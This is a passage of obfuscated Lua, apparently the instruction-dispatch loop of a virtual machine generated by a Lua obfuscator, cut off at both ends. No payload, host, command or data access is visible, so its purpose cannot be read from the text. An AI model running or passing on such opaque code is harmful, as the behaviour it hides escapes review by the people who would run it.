];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g](c[g+1])b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g](c[g+1])b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];g=a[2]c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];end;elseif g<=23 then local g;local e;c[a[2]]=a[3];b=b+1;a=d[b];e=a[2];g=c[a[3]];c[e+1]=g;c[e]=g[c[a[4]]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];e=a[2]c[e]=c[e](f(c,e+1,a[3]))b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];e=a[2];g=c[a[3]];c[e+1]=g;c[e]=g[c[a[4]]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];e=a[2]c[e]=c[e](f(c,e+1,a[3]))b=b+1;a=d[b];e=a[2];g=c[a[3]];c[e+1]=g;c[e]=g[a[4]];elseif g>24 then local h;local g;c[a[2]]();b=b+1;a=d[b];c[a[2]]=c[a[3]]-a[4];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];g=a[2]c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=c[a[3]]*c[a[4]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];if(c[a[2]]==a[4])then b=b+1;else b=a[3];end;else local f;c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];f=a[2]c[f](c[f+1])b=b+1;a=d[b];c[a[2]]=e[a[3]];end;elseif g<=28 then if g<=26 then local d=a[3];local b=c[d]for a=d+1,a[4]do b=b..c[a];end;c[a[2]]=b;elseif g>27 then c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];else c[a[2]]=-c[a[3]];end;elseif g<=29 then local h;local i;local g;c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];i=a[3];h=c[i]for a=i+1,a[4]do h=h..c[a];end;c[a[2]]=h;b=b+1;a=d[b];if(c[a[2]]~=c[a[4]])then b=b+1;else b=a[3];end;elseif g==30 then local h;local i;local g;c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];i=a[3];h=c[i]for a=i+1,a[4]do h=h..c[a];end;c[a[2]]=h;b=b+1;a=d[b];if(c[a[2]]~=c[a[4]])then b=b+1;else b=a[3];end;else local g;local j;local k,m;local l;local g;c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];g=a[2];l=c[a[3]];c[g+1]=l;c[g]=l[a[4]];b=b+1;a=d[b];g=a[2]k,m=i(c[g](c[g+1]))h=m+g-1 j=0;for a=g,h do j=j+1;c[a]=k[j];end;b=b+1;a=d[b];g=a[2]k={c[g](f(c,g+1,h))};j=0;for a=g,a[4]do j=j+1;c[a]=k[j];end b=b+1;a=d[b];b=a[3];end;elseif g<=36 then if g<=33 then if g==32 then local h;local g;c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];e[a[3]]=c[a[2]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g](c[g+1])b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];else local a=a[2]c[a]=c[a]()end;elseif g<=34 then local g;c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];if c[a[2]]then b=b+1;else b=a[3];end;elseif g==35 then local h;local g;c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]][c[a[3]]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[c[a[4]]];else c[a[2]]();end;elseif g<=39 then if g<=37 then local h;local g;c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g](c[g+1])b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=e[a[3]];elseif g>38 then c[a[2]]=c[a[3]]-c[a[4]];else c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=c[a[3]][c[a[4]]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=c[a[3]][c[a[4]]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];end;elseif g<=40 then local h;local g;c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g](c[g+1])b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g](f(c,g+1,a[3]))b=b+1;a=d[b];b=a[3];elseif g>41 then local d=a[3];local b=c[d]for a=d+1,a[4]do b=b..c[a];end;c[a[2]]=b;else c[a[2]]=e[a[3]];end;elseif g<=63 then if g<=52 then if g<=47 then if g<=44 then if g==43 then c[a[2]]=c[a[3]][c[a[4]]];b=b+1;a=d[b];c[a[2]][c[a[3]]]=c[a[4]];b=b+1;a=d[b];c[a[2]][c[a[3]]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]={};b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];else local h;local g;c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g](c[g+1])b=b+1;a=d[b];c[a[2]]={};b=b+1;a=d[b];c[a[2]]=e[a[3]];end;elseif g<=45 then local h;local g;c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];g=a[2]c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g](c[g+1])b=b+1;a=d[b];c[a[2]]=e[a[3]];elseif g==46 then c[a[2]]=#c[a[3]];else if c[a[2]]then b=b+1;else b=a[3];end;end;elseif g<=49 then if g>48 then c[a[2]]();else local d=a[2];local e=c[d]local f=c[d+2];if(f>0)then if(e>c[d+1])then b=a[3];else c[d+3]=e;end elseif(e<c[d+1])then b=a[3];else c[d+3]=e;end end;elseif g<=50 then c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=-c[a[3]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];elseif g==51 then local h=o[a[3]];local g;local f={};g=p({},{__index=function(b,a)local a=f[a];return a[1][a[2]];end,__newindex=function(c,a,b)local a=f[a]a[1][a[2]]=b;end;});for e=1,a[4]do b=b+1;local a=d[b];if a[1]==142 then f[e-1]={c,a[3]};else f[e-1]={k,a[3]};end;l[#l+1]=f;end;c[a[2]]=n(h,g,e);else local k;local m,l;local j;local g;c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];g=a[2];j=c[a[3]];c[g+1]=j;c[g]=j[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];g=a[2]c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];g=a[2];j=c[a[3]];c[g+1]=j;c[g]=j[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];g=a[2]c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];g=a[2];j=c[a[3]];c[g+1]=j;c[g]=j[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];g=a[2]c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];g=a[2];j=c[a[3]];c[g+1]=j;c[g]=j[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];g=a[2]c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g](c[g+1])b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];g=a[2];j=c[a[3]];c[g+1]=j;c[g]=j[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];g=a[2];j=c[a[3]];c[g+1]=j;c[g]=j[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];g=a[2];j=c[a[3]];c[g+1]=j;c[g]=j[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]m,l=i(c[g](f(c,g+1,a[3])))h=l+g-1 k=0;for a=g,h do k=k+1;c[a]=m[k];end;b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,h))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=-c[a[3]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];end;elseif g<=57 then if g<=54 then if g>53 then local a=a[2]local d,b=i(c[a](c[a+1]))h=b+a-1 local b=0;for a=a,h do b=b+1;c[a]=d[b];end;else local h;local f;local g;local e;e=a[2];g=c[a[3]];c[e+1]=g;c[e]=g[a[4]];b=b+1;a=d[b];e=a[2]c[e](c[e+1])b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];e=a[2];f=c[e]h=c[e+2];if(h>0)then if(f>c[e+1])then b=a[3];else c[e+3]=f;end elseif(f<c[e+1])then b=a[3];else c[e+3]=f;end end;elseif g<=55 then local h;local g;c[a[2]]=e[a[3]];b=b+1;a=d[b];g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];if(c[a[2]]==a[4])then b=b+1;else b=a[3];end;elseif g>56 then local h;local g;c[a[2]]=e[a[3]];b=b+1;a=d[b];g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];if(c[a[2]]~=a[4])then b=b+1;else b=a[3];end;else c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];end;elseif g<=60 then if g<=58 then c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];if(c[a[2]]==c[a[4]])then b=b+1;else b=a[3];end;elseif g>59 then local j;local l,k;local g;c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]l,k=i(c[g](f(c,g+1,a[3])))h=k+g-1 j=0;for a=g,h do j=j+1;c[a]=l[j];end;b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,h))b=b+1;a=d[b];c[a[2]][c[a[3]]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]][c[a[3]]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]][c[a[3]]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=c[a[3]][c[a[4]]];b=b+1;a=d[b];c[a[2]][c[a[3]]]=c[a[4]];b=b+1;a=d[b];c[a[2]][c[a[3]]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]={};b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]l,k=i(c[g](f(c,g+1,a[3])))h=k+g-1 j=0;for a=g,h do j=j+1;c[a]=l[j];end;b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,h))b=b+1;a=d[b];c[a[2]][c[a[3]]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]][c[a[3]]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]][c[a[3]]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=c[a[3]][c[a[4]]];b=b+1;a=d[b];c[a[2]][c[a[3]]]=c[a[4]];b=b+1;a=d[b];c[a[2]][c[a[3]]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]={};b=b+1;a=d[b];c[a[2]]=a[3];else local k;local l,m;local j;local g;g=a[2];j=c[a[3]];c[g+1]=j;c[g]=j[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];g=a[2];j=c[a[3]];c[g+1]=j;c[g]=j[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]];b=b+1;a=d[b];g=a[2]l,m=i(c[g](c[g+1]))h=m+g-1 k=0;for a=g,h do k=k+1;c[a]=l[k];end;b=b+1;a=d[b];g=a[2]c[g](f(c,g+1,h))end;elseif g<=61 then local h;local i;local g;c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];i=a[3];h=c[i]for a=i+1,a[4]do 